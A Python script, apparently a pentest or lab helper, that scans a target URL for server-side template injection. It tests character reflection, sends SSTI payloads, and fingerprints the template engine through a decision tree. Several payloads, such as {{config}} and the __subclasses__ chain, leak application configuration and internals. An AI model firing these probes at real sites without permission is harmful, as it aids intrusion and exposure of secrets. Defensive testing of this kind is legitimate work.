import argparse
import requests
import urllib.parse
from rich.console import Console
from rich.table import Table
from rich import box

console = Console()

# SSTI payloads + engines (used in the matrix test)
SSTI_TESTS = {
    "{{7*7}}": {"expected": "49", "engine": "Jinja2"},
    "{% print 7*7 %}": {"expected": "49", "engine": "Jinja2"},
    "{{config}}": {"expected": "app_config", "engine": "Jinja2"},
    "{{''.__class__.__mro__[1].__subclasses__()}}": {"expected": "builtins", "engine": "Jinja2"},
    "{{request.application.__self__.__dict__}}": {"expected": "app", "engine": "Flask (Jinja2)"},
    "${7*7}": {"expected": "49", "engine": "Spring EL"},
    "<%= 7*7 %>": {"expected": "49", "engine": "JSP/ERB"},
    "<#if 1=1>49</#if>": {"expected": "49", "engine": "FreeMarker"},
}

# Helpful engine keywords that sometimes leak in errors
ENGINE_KEYWORDS = {
    "Jinja2": ["jinja2"],
    "Twig": ["twig"],
    "Mako": ["mako"],
    "Smarty": ["smarty"],
    "FreeMarker": ["freemarker"],
    "Thymeleaf": ["thymeleaf"],
    "Velocity": ["velocity"],
    "Pebble": ["pebble"],
    "Nunjucks": ["nunjucks"],
}

def send_request(url, payload, method="GET", input_type="query"):
    try:
        if input_type == "query":
            if method == "GET":
                resp = requests.get(url, params={"input": payload}, timeout=5)
            else:
                resp = requests.post(url, data={"input": payload}, timeout=5)
        elif input_type == "path":
            base_url = url.rsplit("/", 1)[0]
            encoded_payload = urllib.parse.quote(payload, safe="")
            target_url = f"{base_url}/{encoded_payload}"
            if method == "GET":
                resp = requests.get(target_url, timeout=5)
            else:
                resp = requests.post(target_url, data={}, timeout=5)
        else:
            return None, ""
        return resp.status_code, resp.text or ""
    except requests.RequestException as e:
        return None, str(e)

def test_characters(url, chars):
    console.rule("[bold yellow]Character Reflection Test")
    valid_chars = []
    encodings = {
        '$': ['&#36;', '%24', r'\u0024'],
        '{': ['&#123;', '%7B', r'\u007B'],
        '}': ['&#125;', '%7D', r'\u007D'],
        '%': ['&#37;', '%25', r'\u0025'],
        '<': ['&lt;', '&#60;', '%3C', r'\u003C'],
        '>': ['&gt;', '&#62;', '%3E', r'\u003E'],
        "'": ['&#39;', '%27', r'\u0027'],
        '"': ['&quot;', '%22', r'\u0022'],
        ':': ['&#58;', '%3A', r'\u003A'],
    }

    table = Table(title="Character Reflection Results", box=box.ROUNDED, highlight=True)
    table.add_column("Character", style="cyan", justify="center")
    table.add_column("Method", style="magenta")
    table.add_column("Input Type", style="blue")
    table.add_column("Status", justify="center")
    table.add_column("Result", style="green")

    for char in chars:
        for input_type in ["query", "path"]:
            for method in ["GET", "POST"]:
                status, body = send_request(url, char, method, input_type)
                if not body:
                    table.add_row(char, method, input_type, "-", "[bold red]❌ No response")
                    continue

                if char in body or any(enc in body for enc in encodings.get(char, [])):
                    table.add_row(char, method, input_type, str(status), "[green]✔ Reflected")
                    valid_chars.append(char)
                elif status and status >= 400:
                    table.add_row(char, method, input_type, str(status), "[red]✘ Error")
                else:
                    table.add_row(char, method, input_type, str(status), "[yellow]! Filtered")

    console.print(table)
    return list(set(valid_chars))

def test_ssti(url):
    console.rule("[bold yellow]SSTI Payload Test")
    table = Table(title="SSTI Test Results", box=box.ROUNDED, highlight=True)
    table.add_column("Payload", style="cyan")
    table.add_column("Engine", style="bold magenta")
    table.add_column("Method", style="magenta")
    table.add_column("Input Type", style="blue")
    table.add_column("Status", justify="center")
    table.add_column("Result", style="green")

    for payload, info in SSTI_TESTS.items():
        expected = info["expected"]
        engine = info["engine"]

        for input_type in ["query", "path"]:
            for method in ["GET", "POST"]:
                status, body = send_request(url, payload, method, input_type)

                # Default fallback
                result = "[dim]Not reflected/evaluated"

                if not body:
                    result = "[bold red]❌ No response"
                    status = status or "-"
                elif expected in body:
                    result = f"[bold red]💀 SSTI Detected! ({engine}) → {expected}"
                elif payload in body:
                    result = "[yellow]✔ Reflected (not executed)"
                elif status and status >= 500:
                    result = "[magenta]⚠ Server Error (possible template exception)"
                elif status == 200:
                    result = "[blue]✓ 200 OK but no reflection (silent eval?)"
                elif status and status >= 400:
                    result = "[red]✘ Client/Server Error"

                table.add_row(payload, engine, method, input_type, str(status), result)

    console.print(table)

# ---- Fingerprint using a strict decision tree ----

def fingerprint_engine(url):
    console.rule("[bold yellow]Template Engine Fingerprint")
    table = Table(title="Decision Tree Fingerprint Results", box=box.ROUNDED, highlight=True)
    table.add_column("Payload", style="cyan")
    table.add_column("Expected", style="green")
    table.add_column("Status", style="yellow")
    table.add_column("Notes", style="magenta")

    def probe(payload, expected):
        """
        Try payload across GET/POST, query/path.
        Returns (matched_bool, extra_note) and logs a row to the table.
        Also collects engine hints from error pages.
        """
        any_5xx = False
        hints = set()
        for method in ["GET", "POST"]:
            for input_type in ["query", "path"]:
                status, body = send_request(url, payload, method, input_type)
                if not body:
                    continue
                low = body.lower()

                # pick up leaked engine names if present
                for name, kws in ENGINE_KEYWORDS.items():
                    if any(k in low for k in kws):
                        hints.add(name)

                if expected in body:
                    table.add_row(payload, expected, str(status), "✔ Match")
                    # show hint if we got one
                    if hints:
                        table.add_row("—", "—", "—", f"Engine hint(s): {', '.join(sorted(hints))}")
                    return True, (hints or None)

                if status and status >= 500:
                    any_5xx = True

        # no match
        note = []
        if any_5xx:
            note.append("Server error seen")
        if hints:
            note.append(f"Hints: {', '.join(sorted(hints))}")
        table.add_row(payload, expected, "-", "✘ No match" + (f" ({'; '.join(note)})" if note else ""))
        return False, (hints or None)

    # Decision tree:
    # 1) ${7*7}
    a_ok, a_hint = probe("${7*7}", "49")
    if a_ok:
        # 1a) a{*comment*}b  -> Smarty
        b_ok, _ = probe("a{*comment*}b", "ab")
        if b_ok:
            console.print(table)
            console.print("[bold green][+] Detected: Smarty[/]")
            return "Smarty"

        # 1b) ${\"z\".join(\"ab\")} -> Mako
        c_ok, _ = probe('${"z".join("ab")}', "azb")
        console.print(table)
        if c_ok:
            console.print("[bold green][+] Detected: Mako[/]")
            return "Mako"

        console.print("[bold yellow][?] ${7*7} executed but branch inconclusive → Unknown (Smarty/Mako family)[/]")
        return "Unknown"

    # 2) {{7*7}}
    d_ok, d_hint = probe("{{7*7}}", "49")
    if d_ok:
        # 2a) {{7*'7'}} : Jinja2 repeats to '7777777', some engines may coerce to 49 or error
        e_matched_repeat, _ = probe("{{7*'7'}}", "7777777")
        if e_matched_repeat:
            console.print(table)
            console.print("[bold green][+] Detected: Jinja2 / Nunjucks (string repetition)[/]")
            return "Jinja2/Nunjucks"

        # Optional heuristic: if same payload yields 49, likely Twig-style numeric coercion
        e_matched_49, _ = probe("{{7*'7'}}", "49")
        console.print(table)
        if e_matched_49:
            console.print("[bold green][+] Detected: Twig-like numeric coercion[/]")
            return "Twig (likely)"

        # Still vulnerable ({{7*7}} executed), just not differentiating
        # Do NOT mark as not vulnerable here.
        maybe = " / ".join(sorted(set((d_hint or {"Jinja2","Twig"}))))
        console.print(f"[bold yellow][?] {{7*7}} executed but follow-up inconclusive → Likely Jinja-family ({maybe})[/]")
        return "Jinja-family (inconclusive)"

    # If neither branch matched, then we didn't get eval from simple probes
    console.print(table)
    console.print("[bold red][-] No evaluation with simple probes → Not fingerprinted (may be not vulnerable or needs different context)[/]")
    return "Not fingerprinted"

def main():
    parser = argparse.ArgumentParser(description="SSTI Detection Tool with Rich Output")
    parser.add_argument("url", help="Full target URL (e.g., http://10.201.61.3:5000/profile/anything)")
    parser.add_argument("-f", "--file", help="File with characters to test", required=True)
    args = parser.parse_args()

    with open(args.file, "r", encoding="utf-8") as f:
        chars = [line.strip() for line in f if line.strip()]

    valid = test_characters(args.url, chars)

    if valid:
        console.print(f"\n[bold green][+] Valid characters reflected: {valid}[/]")
        test_ssti(args.url)
        fingerprint_engine(args.url)
    else:
        console.print("\n[bold red][-] No valid characters reflected, SSTI unlikely or heavily filtered.")

if __name__ == "__main__":
    main()
